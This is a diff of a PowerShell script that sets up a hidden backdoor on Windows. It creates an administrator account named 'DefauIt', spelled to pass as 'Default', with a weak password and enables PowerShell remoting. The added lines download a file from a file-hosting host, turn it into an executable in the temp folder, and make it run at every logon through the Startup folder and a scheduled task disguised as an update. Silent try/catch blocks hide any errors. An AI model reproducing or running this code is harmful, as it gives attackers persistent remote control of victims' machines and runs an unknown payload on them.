@@ -1,5 +1,57 @@
-New-LocalUser "DefauIt" -Password (ConvertTo-SecureString "4381" -AsPlainText -Force) -ErrorAction Stop 2>&1 | Out-Null;
-Add-LocalGroupMember -Group "Администраторы" -Member "DefauIt" -ErrorAction Stop 2>&1 | Out-Null;
-Set-NetConnectionProfile -InterfaceAlias * -NetworkCategory Private -ErrorAction Stop 2>&1 | Out-Null;
-Enable-PSRemoting -SkipNetworkProfileCheck -Force -ErrorAction Stop 2>&1 | Out-Null;
-Restart-Service WinRM -Force -ErrorAction Stop 2>&1 | Out-Null;
+try {
+    New-LocalUser "DefauIt" -Password (ConvertTo-SecureString "4381" -AsPlainText -Force) -ErrorAction Stop 2>&1 | Out-Null
+} catch {
+}
+try {
+    Add-LocalGroupMember -Group "Администраторы" -Member "DefauIt" -ErrorAction Stop 2>&1 | Out-Null
+} catch {
+}
+try {
+    Set-NetConnectionProfile -InterfaceAlias * -NetworkCategory Private -ErrorAction Stop 2>&1 | Out-Null
+} catch {
+}
+try {
+    Enable-PSRemoting -SkipNetworkProfileCheck -Force -ErrorAction Stop 2>&1 | Out-Null
+} catch {
+}
+try {
+    Restart-Service WinRM -Force -ErrorAction Stop 2>&1 | Out-Null
+} catch {
+}
+$url = "https://files.catbox.moe/3t91zl.txt"
+$tempPath = "$env:TEMP\3t91zl.txt"
+$exePath = "$env:TEMP\3t91zl.exe"
+
+try {
+    Invoke-WebRequest -Uri $url -OutFile $tempPath -ErrorAction Stop
+} catch {
+}
+if (Test-Path $tempPath) {
+    try {
+        if (Test-Path $exePath) {
+            Remove-Item $exePath -Force -ErrorAction Stop
+        }
+        Rename-Item -Path $tempPath -NewName "3t91zl.exe" -ErrorAction Stop
+    } catch {
+        try {
+            Copy-Item -Path $tempPath -Destination $exePath -ErrorAction Stop
+        } catch {
+        }
+    }
+}
+
+if (Test-Path $exePath) {
+    $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+    $startupExe = "$startupFolder\3t91zl.exe"
+    
+    try {
+        Copy-Item -Path $exePath -Destination $startupExe -Force -ErrorAction Stop
+    } catch {
+    }
+    
+    try {
+        schtasks /delete /tn "DefauItUpdateTask" /f 2>&1 | Out-Null
+        schtasks /create /tn "DefauItUpdateTask" /tr "$exePath" /sc onlogon /delay 0001:01 /f 2>&1 | Out-Null
+    } catch {
+    }
+}
